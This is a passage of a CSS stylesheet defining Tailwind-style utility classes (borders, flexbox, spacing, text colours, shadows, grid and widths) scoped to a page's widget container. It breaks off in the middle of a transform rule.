  [page-content] .tailwind-widgets .tw-rounded-b-none {
    border-bottom-right-radius: 0;
    border-bottom-left-radius: 0; }
  [page-content] .tailwind-widgets .tw-rounded-t-md {
    border-top-left-radius: 0.6rem;
    border-top-right-radius: 0.6rem; }
  [page-content] .tailwind-widgets .tw-rounded-r-md {
    border-top-right-radius: 0.6rem;
    border-bottom-right-radius: 0.6rem; }
  [page-content] .tailwind-widgets .tw-rounded-l-md {
    border-top-left-radius: 0.6rem;
    border-bottom-left-radius: 0.6rem; }
  [page-content] .tailwind-widgets .tw-rounded-t-lg {
    border-top-left-radius: 0.8rem;
    border-top-right-radius: 0.8rem; }
  [page-content] .tailwind-widgets .tw-border-dashed {
    border-style: dashed; }
  [page-content] .tailwind-widgets .tw-border-2 {
    border-width: 2px; }
  [page-content] .tailwind-widgets .tw-border-8 {
    border-width: 8px; }
  [page-content] .tailwind-widgets .tw-border {
    border-width: 1px; }
  [page-content] .tailwind-widgets .tw-border-b-2 {
    border-bottom-width: 2px; }
  [page-content] .tailwind-widgets .tw-border-t {
    border-top-width: 1px; }
  [page-content] .tailwind-widgets .tw-border-b {
    border-bottom-width: 1px; }
  [page-content] .tailwind-widgets .tw-cursor-default {
    cursor: default; }
  [page-content] .tailwind-widgets .tw-cursor-pointer {
    cursor: pointer; }
  [page-content] .tailwind-widgets .tw-block {
    display: block; }
  [page-content] .tailwind-widgets .tw-inline-block {
    display: inline-block; }
  [page-content] .tailwind-widgets .tw-flex {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex; }
  [page-content] .tailwind-widgets .tw-inline-flex {
    display: -webkit-inline-box;
    display: -ms-inline-flexbox;
    display: inline-flex; }
  [page-content] .tailwind-widgets .tw-grid {
    display: grid; }
  [page-content] .tailwind-widgets .tw-hidden {
    display: none; }
  [page-content] .tailwind-widgets .tw-flex-row {
    -webkit-box-orient: horizontal;
    -webkit-box-direction: normal;
    -ms-flex-direction: row;
    flex-direction: row; }
  [page-content] .tailwind-widgets .tw-flex-row-reverse {
    -webkit-box-orient: horizontal;
    -webkit-box-direction: reverse;
    -ms-flex-direction: row-reverse;
    flex-direction: row-reverse; }
  [page-content] .tailwind-widgets .tw-flex-col {
    -webkit-box-orient: vertical;
    -webkit-box-direction: normal;
    -ms-flex-direction: column;
    flex-direction: column; }
  [page-content] .tailwind-widgets .tw-flex-wrap {
    -ms-flex-wrap: wrap;
    flex-wrap: wrap; }
  [page-content] .tailwind-widgets .tw-items-start {
    -webkit-box-align: start;
    -ms-flex-align: start;
    align-items: flex-start; }
  [page-content] .tailwind-widgets .tw-items-end {
    -webkit-box-align: end;
    -ms-flex-align: end;
    align-items: flex-end; }
  [page-content] .tailwind-widgets .tw-items-center {
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center; }
  [page-content] .tailwind-widgets .tw-items-baseline {
    -webkit-box-align: baseline;
    -ms-flex-align: baseline;
    align-items: baseline; }
  [page-content] .tailwind-widgets .tw-self-end {
    -ms-flex-item-align: end;
    align-self: flex-end; }
  [page-content] .tailwind-widgets .tw-self-center {
    -ms-flex-item-align: center;
    align-self: center; }
  [page-content] .tailwind-widgets .tw-justify-start {
    -webkit-box-pack: start;
    -ms-flex-pack: start;
    justify-content: flex-start; }
  [page-content] .tailwind-widgets .tw-justify-end {
    -webkit-box-pack: end;
    -ms-flex-pack: end;
    justify-content: flex-end; }
  [page-content] .tailwind-widgets .tw-justify-center {
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    justify-content: center; }
  [page-content] .tailwind-widgets .tw-justify-between {
    -webkit-box-pack: justify;
    -ms-flex-pack: justify;
    justify-content: space-between; }
  [page-content] .tailwind-widgets .tw-flex-1 {
    -webkit-box-flex: 1;
    -ms-flex: 1 1 0%;
    flex: 1 1 0%; }
  [page-content] .tailwind-widgets .tw-flex-auto {
    -webkit-box-flex: 1;
    -ms-flex: 1 1 auto;
    flex: 1 1 auto; }
  [page-content] .tailwind-widgets .tw-flex-grow {
    -webkit-box-flex: 1;
    -ms-flex-positive: 1;
    flex-grow: 1; }
  [page-content] .tailwind-widgets .tw-flex-shrink-0 {
    -ms-flex-negative: 0;
    flex-shrink: 0; }
  [page-content] .tailwind-widgets .tw-font-normal {
    font-weight: 400; }
  [page-content] .tailwind-widgets .tw-font-medium {
    font-weight: 500; }
  [page-content] .tailwind-widgets .tw-font-semibold {
    font-weight: 600; }
  [page-content] .tailwind-widgets .tw-font-bold {
    font-weight: 700; }
  [page-content] .tailwind-widgets .tw-h-1 {
    height: 0.4rem; }
  [page-content] .tailwind-widgets .tw-h-3 {
    height: 1.2rem; }
  [page-content] .tailwind-widgets .tw-h-4 {
    height: 1.6rem; }
  [page-content] .tailwind-widgets .tw-h-5 {
    height: 2rem; }
  [page-content] .tailwind-widgets .tw-h-6 {
    height: 2.4rem; }
  [page-content] .tailwind-widgets .tw-h-10 {
    height: 3.6rem; }
  [page-content] .tailwind-widgets .tw-h-12 {
    height: 4.8rem; }
  [page-content] .tailwind-widgets .tw-h-14 {
    height: 3.5rem; }
  [page-content] .tailwind-widgets .tw-h-16 {
    height: 6.4rem; }
  [page-content] .tailwind-widgets .tw-h-32 {
    height: 12.8rem; }
  [page-content] .tailwind-widgets .tw-h-full {
    height: 100%; }
  [page-content] .tailwind-widgets .tw-text-xs {
    font-size: 1.2rem; }
  [page-content] .tailwind-widgets .tw-text-sm {
    font-size: 1.4rem; }
  [page-content] .tailwind-widgets .tw-text-base {
    font-size: 1.6rem; }
  [page-content] .tailwind-widgets .tw-text-lg {
    font-size: 1.8rem; }
  [page-content] .tailwind-widgets .tw-text-2xl {
    font-size: 2.4rem; }
  [page-content] .tailwind-widgets .tw-text-3xl {
    font-size: 3rem; }
  [page-content] .tailwind-widgets .tw-leading-4 {
    line-height: 1.6rem; }
  [page-content] .tailwind-widgets .tw-leading-5 {
    line-height: 2rem; }
  [page-content] .tailwind-widgets .tw-leading-6 {
    line-height: 2.4rem; }
  [page-content] .tailwind-widgets .tw-leading-7 {
    line-height: 2.8rem; }
  [page-content] .tailwind-widgets .tw-leading-8 {
    line-height: 3.2rem; }
  [page-content] .tailwind-widgets .tw-leading-none {
    line-height: 1; }
  [page-content] .tailwind-widgets .tw-leading-tight {
    line-height: 1.25; }
  [page-content] .tailwind-widgets .tw-list-inside {
    list-style-position: inside; }
  [page-content] .tailwind-widgets .tw-list-disc {
    list-style-type: disc; }
  [page-content] .tailwind-widgets .tw-m-2 {
    margin: 0.8rem; }
  [page-content] .tailwind-widgets .tw-m-3 {
    margin: 1.2rem; }
  [page-content] .tailwind-widgets .tw-m-4 {
    margin: 1.6rem; }
  [page-content] .tailwind-widgets .tw-m-6 {
    margin: 2.4rem; }
  [page-content] .tailwind-widgets .tw-m-px {
    margin: 1px; }
  [page-content] .tailwind-widgets .tw-my-1 {
    margin-top: 0.4rem;
    margin-bottom: 0.4rem; }
  [page-content] .tailwind-widgets .tw-mx-1 {
    margin-left: 0.4rem;
    margin-right: 0.4rem; }
  [page-content] .tailwind-widgets .tw-my-2 {
    margin-top: 0.8rem;
    margin-bottom: 0.8rem; }
  [page-content] .tailwind-widgets .tw-mx-2 {
    margin-left: 0.8rem;
    margin-right: 0.8rem; }
  [page-content] .tailwind-widgets .tw-my-5 {
    margin-top: 2rem;
    margin-bottom: 2rem; }
  [page-content] .tailwind-widgets .tw-my-6 {
    margin-top: 2.4rem;
    margin-bottom: 2.4rem; }
  [page-content] .tailwind-widgets .tw-mx-6 {
    margin-left: 2.4rem;
    margin-right: 2.4rem; }
  [page-content] .tailwind-widgets .tw-mx-auto {
    margin-left: auto;
    margin-right: auto; }
  [page-content] .tailwind-widgets .tw--my-1 {
    margin-top: -0.4rem;
    margin-bottom: -0.4rem; }
  [page-content] .tailwind-widgets .tw--mx-1 {
    margin-left: -0.4rem;
    margin-right: -0.4rem; }
  [page-content] .tailwind-widgets .tw--my-2 {
    margin-top: -0.8rem;
    margin-bottom: -0.8rem; }
  [page-content] .tailwind-widgets .tw--my-1\.5 {
    margin-top: -0.375rem;
    margin-bottom: -0.375rem; }
  [page-content] .tailwind-widgets .tw--mx-1\.5 {
    margin-left: -0.375rem;
    margin-right: -0.375rem; }
  [page-content] .tailwind-widgets .tw-mt-0 {
    margin-top: 0; }
  [page-content] .tailwind-widgets .tw-mb-0 {
    margin-bottom: 0; }
  [page-content] .tailwind-widgets .tw-mt-1 {
    margin-top: 0.4rem; }
  [page-content] .tailwind-widgets .tw-mr-1 {
    margin-right: 0.4rem; }
  [page-content] .tailwind-widgets .tw-mb-1 {
    margin-bottom: 0.4rem; }
  [page-content] .tailwind-widgets .tw-ml-1 {
    margin-left: 0.4rem; }
  [page-content] .tailwind-widgets .tw-mt-2 {
    margin-top: 0.8rem; }
  [page-content] .tailwind-widgets .tw-mb-2 {
    margin-bottom: 0.8rem; }
  [page-content] .tailwind-widgets .tw-ml-2 {
    margin-left: 0.8rem; }
  [page-content] .tailwind-widgets .tw-mt-3 {
    margin-top: 1.2rem; }
  [page-content] .tailwind-widgets .tw-mr-3 {
    margin-right: 1.2rem; }
  [page-content] .tailwind-widgets .tw-mb-3 {
    margin-bottom: 1.2rem; }
  [page-content] .tailwind-widgets .tw-ml-3 {
    margin-left: 1.2rem; }
  [page-content] .tailwind-widgets .tw-mt-4 {
    margin-top: 1.6rem; }
  [page-content] .tailwind-widgets .tw-mb-4 {
    margin-bottom: 1.6rem; }
  [page-content] .tailwind-widgets .tw-ml-4 {
    margin-left: 1.6rem; }
  [page-content] .tailwind-widgets .tw-mt-5 {
    margin-top: 2rem; }
  [page-content] .tailwind-widgets .tw-mb-5 {
    margin-bottom: 2rem; }
  [page-content] .tailwind-widgets .tw-mb-6 {
    margin-bottom: 2.4rem; }
  [page-content] .tailwind-widgets .tw-mb-8 {
    margin-bottom: 3.2rem; }
  [page-content] .tailwind-widgets .tw-ml-8 {
    margin-left: 3.2rem; }
  [page-content] .tailwind-widgets .tw-mt-12 {
    margin-top: 4.8rem; }
  [page-content] .tailwind-widgets .tw-mb-12 {
    margin-bottom: 4.8rem; }
  [page-content] .tailwind-widgets .tw-ml-auto {
    margin-left: auto; }
  [page-content] .tailwind-widgets .tw--mr-1 {
    margin-right: -0.4rem; }
  [page-content] .tailwind-widgets .tw--ml-1 {
    margin-left: -0.4rem; }
  [page-content] .tailwind-widgets .tw--mt-8 {
    margin-top: -3.2rem; }
  [page-content] .tailwind-widgets .tw--ml-px {
    margin-left: -1px; }
  [page-content] .tailwind-widgets .tw-max-w-xl {
    max-width: 57.6rem; }
  [page-content] .tailwind-widgets .tw-max-w-4xl {
    max-width: 89.6rem; }
  [page-content] .tailwind-widgets .tw-max-w-screen-xl {
    max-width: 1280px; }
  [page-content] .tailwind-widgets .tw-min-h-screen {
    min-height: 100vh; }
  [page-content] .tailwind-widgets .tw-min-w-0 {
    min-width: 0; }
  [page-content] .tailwind-widgets .tw-min-w-full {
    min-width: 100%; }
  [page-content] .tailwind-widgets .tw-opacity-0 {
    opacity: 0; }
  [page-content] .tailwind-widgets .tw-opacity-75 {
    opacity: 0.75; }
  [page-content] .tailwind-widgets .focus\:tw-outline-none:focus {
    outline: 0; }
  [page-content] .tailwind-widgets .tw-overflow-auto {
    overflow: auto; }
  [page-content] .tailwind-widgets .tw-overflow-hidden {
    overflow: hidden; }
  [page-content] .tailwind-widgets .tw-overflow-x-auto {
    overflow-x: auto; }
  [page-content] .tailwind-widgets .tw-overflow-y-auto {
    overflow-y: auto; }
  [page-content] .tailwind-widgets .tw-p-1 {
    padding: 0.4rem; }
  [page-content] .tailwind-widgets .tw-p-2 {
    padding: 0.8rem; }
  [page-content] .tailwind-widgets .tw-p-3 {
    padding: 1.2rem; }
  [page-content] .tailwind-widgets .tw-p-4 {
    padding: 1.6rem; }
  [page-content] .tailwind-widgets .tw-p-6 {
    padding: 2.4rem; }
  [page-content] .tailwind-widgets .tw-p-8 {
    padding: 3.2rem; }
  [page-content] .tailwind-widgets .tw-p-px {
    padding: 1px; }
  [page-content] .tailwind-widgets .tw-p-1\.5 {
    padding: 0.375rem; }
  [page-content] .tailwind-widgets .tw-py-0 {
    padding-top: 0;
    padding-bottom: 0; }
  [page-content] .tailwind-widgets .tw-py-1 {
    padding-top: 0.4rem;
    padding-bottom: 0.4rem; }
  [page-content] .tailwind-widgets .tw-px-1 {
    padding-left: 0.4rem;
    padding-right: 0.4rem; }
  [page-content] .tailwind-widgets .tw-py-2 {
    padding-top: 0.8rem;
    padding-bottom: 0.8rem; }
  [page-content] .tailwind-widgets .tw-px-2 {
    padding-left: 0.8rem;
    padding-right: 0.8rem; }
  [page-content] .tailwind-widgets .tw-py-3 {
    padding-top: 1.2rem;
    padding-bottom: 1.2rem; }
  [page-content] .tailwind-widgets .tw-px-3 {
    padding-left: 1.2rem;
    padding-right: 1.2rem; }
  [page-content] .tailwind-widgets .tw-py-4 {
    padding-top: 1.6rem;
    padding-bottom: 1.6rem; }
  [page-content] .tailwind-widgets .tw-px-4 {
    padding-left: 1.6rem;
    padding-right: 1.6rem; }
  [page-content] .tailwind-widgets .tw-py-5 {
    padding-top: 2rem;
    padding-bottom: 2rem; }
  [page-content] .tailwind-widgets .tw-py-6 {
    padding-top: 2.4rem;
    padding-bottom: 2.4rem; }
  [page-content] .tailwind-widgets .tw-px-6 {
    padding-left: 2.4rem;
    padding-right: 2.4rem; }
  [page-content] .tailwind-widgets .tw-py-0\.5 {
    padding-top: 0.125rem;
    padding-bottom: 0.125rem; }
  [page-content] .tailwind-widgets .tw-pt-0 {
    padding-top: 0; }
  [page-content] .tailwind-widgets .tw-pr-2 {
    padding-right: 0.8rem; }
  [page-content] .tailwind-widgets .tw-pb-2 {
    padding-bottom: 0.8rem; }
  [page-content] .tailwind-widgets .tw-pl-2 {
    padding-left: 0.8rem; }
  [page-content] .tailwind-widgets .tw-pr-3 {
    padding-right: 1.2rem; }
  [page-content] .tailwind-widgets .tw-pl-3 {
    padding-left: 1.2rem; }
  [page-content] .tailwind-widgets .tw-pt-4 {
    padding-top: 1.6rem; }
  [page-content] .tailwind-widgets .tw-pr-4 {
    padding-right: 1.6rem; }
  [page-content] .tailwind-widgets .tw-pb-4 {
    padding-bottom: 1.6rem; }
  [page-content] .tailwind-widgets .tw-pl-4 {
    padding-left: 1.6rem; }
  [page-content] .tailwind-widgets .tw-pt-5 {
    padding-top: 2rem; }
  [page-content] .tailwind-widgets .tw-pl-5 {
    padding-left: 2rem; }
  [page-content] .tailwind-widgets .tw-pt-6 {
    padding-top: 2.4rem; }
  [page-content] .tailwind-widgets .tw-pb-8 {
    padding-bottom: 3.2rem; }
  [page-content] .tailwind-widgets .tw-pr-9 {
    padding-right: 2.25rem; }
  [page-content] .tailwind-widgets .tw-pr-10 {
    padding-right: 3.6rem; }
  [page-content] .tailwind-widgets .tw-pb-20 {
    padding-bottom: 8rem; }
  [page-content] .tailwind-widgets .tw-pt-0\.5 {
    padding-top: 0.125rem; }
  [page-content] .tailwind-widgets .tw-pointer-events-none {
    pointer-events: none; }
  [page-content] .tailwind-widgets .tw-pointer-events-auto {
    pointer-events: auto; }
  [page-content] .tailwind-widgets .tw-fixed {
    position: fixed; }
  [page-content] .tailwind-widgets .tw-absolute {
    position: absolute; }
  [page-content] .tailwind-widgets .tw-relative {
    position: relative; }
  [page-content] .tailwind-widgets .tw-inset-0 {
    top: 0;
    right: 0;
    bottom: 0;
    left: 0; }
  [page-content] .tailwind-widgets .tw-inset-y-0 {
    top: 0;
    bottom: 0; }
  [page-content] .tailwind-widgets .tw-top-0 {
    top: 0; }
  [page-content] .tailwind-widgets .tw-right-0 {
    right: 0; }
  [page-content] .tailwind-widgets .tw-resize {
    resize: both; }
  [page-content] .tailwind-widgets .tw-shadow-xs {
    -webkit-box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.05);
    box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.05); }
  [page-content] .tailwind-widgets .tw-shadow-sm {
    -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
    box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); }
  [page-content] .tailwind-widgets .tw-shadow {
    -webkit-box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
    box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); }
  [page-content] .tailwind-widgets .tw-shadow-lg {
    -webkit-box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
    box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
  [page-content] .tailwind-widgets .tw-shadow-xl {
    -webkit-box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
  [page-content] .tailwind-widgets .focus\:tw-shadow-outline:focus {
    -webkit-box-shadow: 0 0 0 3px rgba(118, 169, 250, 0.45);
    box-shadow: 0 0 0 3px rgba(118, 169, 250, 0.45); }
  [page-content] .tailwind-widgets .focus\:tw-shadow-outline-blue:focus {
    -webkit-box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45);
    box-shadow: 0 0 0 3px rgba(164, 202, 254, 0.45); }
  [page-content] .tailwind-widgets .tw-fill-current {
    fill: currentColor; }
  [page-content] .tailwind-widgets .tw-text-left {
    text-align: left; }
  [page-content] .tailwind-widgets .tw-text-center {
    text-align: center; }
  [page-content] .tailwind-widgets .tw-text-right {
    text-align: right; }
  [page-content] .tailwind-widgets .tw-text-white {
    --text-opacity: 1;
    color: #ffffff;
    color: rgba(255, 255, 255, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-black {
    --text-opacity: 1;
    color: #000000;
    color: rgba(0, 0, 0, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-200 {
    --text-opacity: 1;
    color: #e5e7eb;
    color: rgba(229, 231, 235, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-300 {
    --text-opacity: 1;
    color: #d2d6dc;
    color: rgba(210, 214, 220, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-400 {
    --text-opacity: 1;
    color: #9fa6b2;
    color: rgba(159, 166, 178, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-500 {
    --text-opacity: 1;
    color: #6b7280;
    color: rgba(107, 114, 128, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-600 {
    --text-opacity: 1;
    color: #4b5563;
    color: rgba(75, 85, 99, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-700 {
    --text-opacity: 1;
    color: #374151;
    color: rgba(55, 65, 81, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-800 {
    --text-opacity: 1;
    color: #252f3f;
    color: rgba(37, 47, 63, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-gray-900 {
    --text-opacity: 1;
    color: #161e2e;
    color: rgba(22, 30, 46, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-red-400 {
    --text-opacity: 1;
    color: #f98080;
    color: rgba(249, 128, 128, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-red-500 {
    --text-opacity: 1;
    color: #f05252;
    color: rgba(240, 82, 82, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-red-600 {
    --text-opacity: 1;
    color: #e02424;
    color: rgba(224, 36, 36, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-red-700 {
    --text-opacity: 1;
    color: #c81e1e;
    color: rgba(200, 30, 30, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-red-800 {
    --text-opacity: 1;
    color: #9b1c1c;
    color: rgba(155, 28, 28, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-orange-800 {
    --text-opacity: 1;
    color: #8a2c0d;
    color: rgba(138, 44, 13, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-yellow-400 {
    --text-opacity: 1;
    color: #e3a008;
    color: rgba(227, 160, 8, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-yellow-700 {
    --text-opacity: 1;
    color: #8e4b10;
    color: rgba(142, 75, 16, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-yellow-800 {
    --text-opacity: 1;
    color: #723b13;
    color: rgba(114, 59, 19, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-green-400 {
    --text-opacity: 1;
    color: #31c48d;
    color: rgba(49, 196, 141, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-green-500 {
    --text-opacity: 1;
    color: #0e9f6e;
    color: rgba(14, 159, 110, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-green-600 {
    --text-opacity: 1;
    color: #057a55;
    color: rgba(5, 122, 85, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-green-700 {
    --text-opacity: 1;
    color: #046c4e;
    color: rgba(4, 108, 78, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-green-800 {
    --text-opacity: 1;
    color: #03543f;
    color: rgba(3, 84, 63, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-teal-800 {
    --text-opacity: 1;
    color: #05505c;
    color: rgba(5, 80, 92, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-blue-400 {
    --text-opacity: 1;
    color: #76a9fa;
    color: rgba(118, 169, 250, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-blue-700 {
    --text-opacity: 1;
    color: #1a56db;
    color: rgba(26, 86, 219, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-blue-800 {
    --text-opacity: 1;
    color: #1e429f;
    color: rgba(30, 66, 159, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-indigo-500 {
    --text-opacity: 1;
    color: #6875f5;
    color: rgba(104, 117, 245, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-indigo-600 {
    --text-opacity: 1;
    color: #5850ec;
    color: rgba(88, 80, 236, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-indigo-800 {
    --text-opacity: 1;
    color: #42389d;
    color: rgba(66, 56, 157, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-purple-800 {
    --text-opacity: 1;
    color: #5521b5;
    color: rgba(85, 33, 181, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-text-pink-800 {
    --text-opacity: 1;
    color: #99154b;
    color: rgba(153, 21, 75, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-group:hover .group-hover\:tw-text-gray-500 {
    --text-opacity: 1;
    color: #6b7280;
    color: rgba(107, 114, 128, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-group:hover .group-hover\:tw-text-green-500 {
    --text-opacity: 1;
    color: #0e9f6e;
    color: rgba(14, 159, 110, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-group:focus .group-focus\:tw-text-gray-500 {
    --text-opacity: 1;
    color: #6b7280;
    color: rgba(107, 114, 128, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-group:focus .group-focus\:tw-text-green-500 {
    --text-opacity: 1;
    color: #0e9f6e;
    color: rgba(14, 159, 110, var(--text-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-text-gray-200:hover {
    --text-opacity: 1;
    color: #e5e7eb;
    color: rgba(229, 231, 235, var(--text-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-text-gray-400:hover {
    --text-opacity: 1;
    color: #9fa6b2;
    color: rgba(159, 166, 178, var(--text-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-text-gray-500:hover {
    --text-opacity: 1;
    color: #6b7280;
    color: rgba(107, 114, 128, var(--text-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-text-gray-700:hover {
    --text-opacity: 1;
    color: #374151;
    color: rgba(55, 65, 81, var(--text-opacity)); }
  [page-content] .tailwind-widgets .hover\:tw-text-yellow-600:hover {
    --text-opacity: 1;
    color: #9f580a;
    color: rgba(159, 88, 10, var(--text-opacity)); }
  [page-content] .tailwind-widgets .active\:tw-text-gray-500:active {
    --text-opacity: 1;
    color: #6b7280;
    color: rgba(107, 114, 128, var(--text-opacity)); }
  [page-content] .tailwind-widgets .active\:tw-text-gray-700:active {
    --text-opacity: 1;
    color: #374151;
    color: rgba(55, 65, 81, var(--text-opacity)); }
  [page-content] .tailwind-widgets .active\:tw-text-gray-800:active {
    --text-opacity: 1;
    color: #252f3f;
    color: rgba(37, 47, 63, var(--text-opacity)); }
  [page-content] .tailwind-widgets .tw-uppercase {
    text-transform: uppercase; }
  [page-content] .tailwind-widgets .hover\:tw-underline:hover {
    text-decoration: underline; }
  [page-content] .tailwind-widgets .tw-tracking-wider {
    letter-spacing: 0.08em; }
  [page-content] .tailwind-widgets .tw-select-none {
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none; }
  [page-content] .tailwind-widgets .tw-align-middle {
    vertical-align: middle; }
  [page-content] .tailwind-widgets .tw-align-bottom {
    vertical-align: bottom; }
  [page-content] .tailwind-widgets .tw-visible {
    visibility: visible; }
  [page-content] .tailwind-widgets .tw-invisible {
    visibility: hidden; }
  [page-content] .tailwind-widgets .tw-whitespace-no-wrap {
    white-space: nowrap; }
  [page-content] .tailwind-widgets .tw-truncate {
    overflow: hidden;
    -o-text-overflow: ellipsis;
    text-overflow: ellipsis;
    white-space: nowrap; }
  [page-content] .tailwind-widgets .tw-w-0 {
    width: 0; }
  [page-content] .tailwind-widgets .tw-w-3 {
    width: 1.2rem; }
  [page-content] .tailwind-widgets .tw-w-4 {
    width: 1.6rem; }
  [page-content] .tailwind-widgets .tw-w-5 {
    width: 2rem; }
  [page-content] .tailwind-widgets .tw-w-6 {
    width: 2.4rem; }
  [page-content] .tailwind-widgets .tw-w-8 {
    width: 3.2rem; }
  [page-content] .tailwind-widgets .tw-w-10 {
    width: 3.6rem; }
  [page-content] .tailwind-widgets .tw-w-12 {
    width: 4.8rem; }
  [page-content] .tailwind-widgets .tw-w-14 {
    width: 3.5rem; }
  [page-content] .tailwind-widgets .tw-w-16 {
    width: 6.4rem; }
  [page-content] .tailwind-widgets .tw-w-28 {
    width: 7rem; }
  [page-content] .tailwind-widgets .tw-w-44 {
    width: 11rem; }
  [page-content] .tailwind-widgets .tw-w-48 {
    width: 19.2rem; }
  [page-content] .tailwind-widgets .tw-w-56 {
    width: 22.4rem; }
  [page-content] .tailwind-widgets .tw-w-80 {
    width: 30rem; }
  [page-content] .tailwind-widgets .tw-w-1\/2 {
    width: 50%; }
  [page-content] .tailwind-widgets .tw-w-1\/3 {
    width: 33.333333%; }
  [page-content] .tailwind-widgets .tw-w-2\/3 {
    width: 66.666667%; }
  [page-content] .tailwind-widgets .tw-w-3\/4 {
    width: 75%; }
  [page-content] .tailwind-widgets .tw-w-full {
    width: 100%; }
  [page-content] .tailwind-widgets .tw-z-0 {
    z-index: 0; }
  [page-content] .tailwind-widgets .tw-z-10 {
    z-index: 10; }
  [page-content] .tailwind-widgets .tw-z-30 {
    z-index: 30; }
  [page-content] .tailwind-widgets .tw-z-40 {
    z-index: 40; }
  [page-content] .tailwind-widgets .tw-z-50 {
    z-index: 50; }
  [page-content] .tailwind-widgets .focus\:tw-z-10:focus {
    z-index: 10; }
  [page-content] .tailwind-widgets .tw-gap-1 {
    grid-gap: 0.4rem;
    gap: 0.4rem; }
  [page-content] .tailwind-widgets .tw-gap-2 {
    grid-gap: 0.8rem;
    gap: 0.8rem; }
  [page-content] .tailwind-widgets .tw-gap-x-4 {
    grid-column-gap: 1.6rem;
    -webkit-column-gap: 1.6rem;
    -moz-column-gap: 1.6rem;
    column-gap: 1.6rem; }
  [page-content] .tailwind-widgets .tw-gap-y-1 {
    grid-row-gap: 0.4rem;
    row-gap: 0.4rem; }
  [page-content] .tailwind-widgets .tw-gap-y-8 {
    grid-row-gap: 3.2rem;
    row-gap: 3.2rem; }
  [page-content] .tailwind-widgets .tw-gap-y-12 {
    grid-row-gap: 4.8rem;
    row-gap: 4.8rem; }
  [page-content] .tailwind-widgets .tw-grid-cols-1 {
    grid-template-columns: repeat(1, minmax(0, 1fr)); }
  [page-content] .tailwind-widgets .tw-grid-cols-7 {
    grid-template-columns: repeat(7, minmax(0, 1fr)); }
  [page-content] .tailwind-widgets .tw-grid-cols-12 {
    grid-template-columns: repeat(12, minmax(0, 1fr)); }
  [page-content] .tailwind-widgets .tw-col-span-3 {
    grid-column: span 3 / span 3; }
  [page-content] .tailwind-widgets .tw-col-span-4 {
    grid-column: span 4 / span 4; }
  [page-content] .tailwind-widgets .tw-col-span-12 {
    grid-column: span 12 / span 12; }
  [page-content] .tailwind-widgets .tw-grid-rows-1 {
    grid-template-rows: repeat(1, minmax(0, 1fr)); }
  [page-content] .tailwind-widgets .tw-transform {
    --transform-translate-x: 0;
    --transform-translate-y: 0;
    --transform-rotate: 0;
    --transform-skew-x: 0;
    --transform-skew-y: 0;
    --transform-scale-x: 1;
    --transform-scale-y: 1;
    -webkit-transform: translateX(var(--transform-translate-x)) translateY(var(--transform-translate-y)) rotate(var(--transform-rotate)) skewX(var(--transform-skew-x)) skewY(var(--transform-skew-y)) scaleX(var(--transform-scale-x)) scaleY(var(--transform-scale-y));
